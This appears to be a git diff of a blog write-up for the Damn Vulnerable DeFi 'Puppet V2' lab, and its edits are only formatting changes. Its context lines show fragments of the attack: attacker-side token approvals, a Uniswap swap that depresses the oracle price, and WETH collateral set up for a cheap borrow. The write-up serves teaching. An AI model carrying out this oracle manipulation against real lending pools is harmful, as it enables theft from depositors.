@@ -604,7 +604,7 @@ There is 1 contract and UniswapV2 library:
 The contract diagram for the Puppet V2 Pool generated with the Solidity Visual Auditor extension is the following:
 
 <figure style="text-align:center;">
-    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/puppetv2.png" title="PuppetV2Pool" width="500"/>
+    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/puppetv2.png" title="PuppetV2Pool" width="700"/>
     <figcaption>Puppet V2 Pool</figcaption>
 </figure>
 
@@ -637,7 +637,6 @@ await this.token.connect(attacker).approve(
 ```
 
 2. We swap DVT for ETH to increase the DVT token reserve. This will make the denominater greater than the numerator, resulting in decreasing the quote price
-
 ```
 await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
     ATTACKER_INITIAL_TOKEN_BALANCE, //amountIn
@@ -662,7 +661,6 @@ await this.weth.connect(attacker).deposit({
 ```
 
 5. Now we approve the amount of WETH to the pool, so it can trasnfer our collateral for performing the borrow successfully
-
 ```
 await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
 ```
